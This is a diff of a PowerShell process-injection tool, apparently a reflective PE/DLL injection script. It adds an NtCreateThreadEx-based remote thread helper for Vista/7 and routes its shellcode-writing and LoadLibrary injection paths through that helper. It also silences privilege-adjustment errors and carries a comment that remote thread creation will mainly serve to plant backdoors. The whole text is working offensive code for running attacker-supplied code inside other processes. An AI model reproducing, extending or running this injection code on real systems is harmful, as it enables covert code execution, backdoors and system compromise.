@@ -643,6 +643,11 @@ $RemoteScriptBlock = {
         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
 		
+		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
+        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
+        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
+		
 		return $Win32Functions
 	}
 	#####################################
@@ -980,7 +985,7 @@ $RemoteScriptBlock = {
 		{
 			Throw "Unable to call LookupPrivilegeValue"
 		}
-		
+
 		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.TOKEN_PRIVILEGES)
 		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
 		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, $Win32Types.TOKEN_PRIVILEGES)
@@ -988,13 +993,56 @@ $RemoteScriptBlock = {
 		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, $Win32Types.LUID)
 		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
 		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
-		
+
 		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-		if ($Result -eq $false)
+		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
+		if (($Result -eq $false) -or ($ErrorCode -ne 0))
 		{
-			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-			Throw "Unable to call AdjustTokenPrivileges. Errorcode: $ErrorCode"
+			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
 		}
+		
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
+	}
+	
+	
+	Function Invoke-CreateRemoteThread
+	{
+		Param(
+		[Parameter(Position = 1, Mandatory = $true)]
+		[IntPtr]
+		$ProcessHandle,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[IntPtr]
+		$StartAddress,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions
+		)
+		
+		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
+		
+		$OSVersion = [Environment]::OSVersion.Version
+		Write-Verbose "todo $OSVersion"
+		#Vista and Win7
+		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
+		{
+			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx"
+			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
+			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
+			{
+				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
+			}
+		}
+		#XP/Win8
+		else
+		{
+			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $StartAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		}
+		
+		return $RemoteThreadHandle
 	}
 
 
@@ -1226,7 +1274,7 @@ $RemoteScriptBlock = {
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
 		
 		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
-		$DllPathSize = [UIntPtr]([UInt64]$ImportDllPath.Length + 1)
+		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
 		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
 		{
@@ -1305,7 +1353,8 @@ $RemoteScriptBlock = {
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+			#tododelete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1326,7 +1375,8 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $LoadLibraryAAddr, $RImportDllPathPtr, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -Win32Functions $Win32Functions
+			#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $LoadLibraryAAddr, $RImportDllPathPtr, 0, [IntPtr]::Zero)
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1369,7 +1419,7 @@ $RemoteScriptBlock = {
 		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
 		
 		#Write FunctionName to memory (will be used in GetProcAddress)
-		$FunctionNameSize = [UIntPtr]([UInt64]$FunctionName.Length + 1)
+		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
 		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($RFuncNamePtr -eq [IntPtr]::Zero)
 		{
@@ -1455,7 +1505,8 @@ $RemoteScriptBlock = {
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+		#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
 		{
@@ -2449,7 +2500,8 @@ $RemoteScriptBlock = {
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+				#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
 				{
@@ -2580,12 +2632,17 @@ $RemoteScriptBlock = {
 			}
 			else
 			{
-				$ProcId = $Processes.ID
+				$ProcId = $Processes[0].ID
 			}
 		}
 		
-		#todo only do this for remote processes
-		Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
+		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
+#		if ((Get-Process -Id $PID).SessionId -eq (Get-Process -Id $ProcId).SessionId) #todo fix this logic
+#		{
+#			Write-Verbose "Getting SeDebugPrivilege"
+#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants #todo remove priv when done? probably not
+#		}	
 		
 		if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		{
@@ -2686,7 +2743,8 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
-			$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]$VoidFuncAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+			#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]$VoidFuncAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 		}
 		
 		#Don't free a library if it is injected in a remote process
